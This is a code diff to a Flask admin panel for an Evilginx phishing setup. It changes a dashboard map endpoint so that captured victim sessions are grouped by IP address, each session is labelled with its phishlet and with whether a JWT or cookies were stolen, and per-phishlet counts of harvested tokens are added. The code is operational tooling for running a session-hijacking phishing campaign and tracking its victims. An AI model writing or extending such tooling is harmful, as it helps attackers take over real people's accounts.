@@ -43,7 +43,7 @@ PANEL_HOST = os.environ.get("PANEL_HOST", "0.0.0.0")
 PANEL_PORT = int(os.environ.get("PANEL_PORT", "8443"))
 PANEL_USER = os.environ.get("PANEL_USER", "root")
 PANEL_PASS = os.environ.get("PANEL_PASS", "")
-PANEL_VERSION = "3.5.5"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
+PANEL_VERSION = "3.5.6"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
 
 # ═══════════════════════════════════════════════════════════════════════════════
 #  FLASK SETUP
@@ -891,16 +891,26 @@ def api_dashboard_map():
                     "empty": 0,
                     "n": 0,
                     "ids": [],
+                    "sess": [],
                 }
                 buckets[ip] = b
             b["n"] += 1
             try:
-                b["ids"].append(int(s.get("id")))
+                sid = int(s.get("id"))
             except (TypeError, ValueError):
-                pass
+                sid = s.get("id")
+            if sid is not None:
+                b["ids"].append(sid)
+            has_tokens = (s.get("n_cookies") or 0) > 0
+            b["sess"].append({
+                "id": sid,
+                "phishlet": (s.get("phishlet") or "").strip(),
+                "jwt": bool(s.get("has_jwt")),
+                "tokens": has_tokens,
+            })
             if s.get("has_jwt"):
                 b["jwt"] += 1
-            if (s.get("n_cookies") or 0) > 0:
+            if has_tokens:
                 b["tokens"] += 1
             else:
                 b["empty"] += 1
@@ -909,7 +919,31 @@ def api_dashboard_map():
                 _geo_save_cache()
             except Exception:
                 pass
-    return jsonify(counts=counts, points=list(buckets.values()), unknown=unknown)
+    ph_stats = {}
+    for s in ss:
+        name = (s.get("phishlet") or "").strip()
+        if not name:
+            continue
+        st = ph_stats.setdefault(name, {"n": 0, "jwt": 0, "tokens": 0, "empty": 0})
+        st["n"] += 1
+        if s.get("has_jwt"):
+            st["jwt"] += 1
+        if (s.get("n_cookies") or 0) > 0:
+            st["tokens"] += 1
+        else:
+            st["empty"] += 1
+    names = set(ph_stats)
+    try:
+        names.update(p["name"] for p in _list_phishlets() if p.get("name"))
+    except Exception:
+        pass
+    phishlets = []
+    for n in sorted(names, key=str.lower):
+        st = ph_stats.get(n) or {"n": 0, "jwt": 0, "tokens": 0, "empty": 0}
+        phishlets.append({"name": n, "n": st["n"], "jwt": st["jwt"],
+                          "tokens": st["tokens"], "empty": st["empty"]})
+    return jsonify(counts=counts, points=list(buckets.values()),
+                   unknown=unknown, phishlets=phishlets)
 
 # ═══════════════════════════════════════════════════════════════════════════════
 #  API — CONFIG
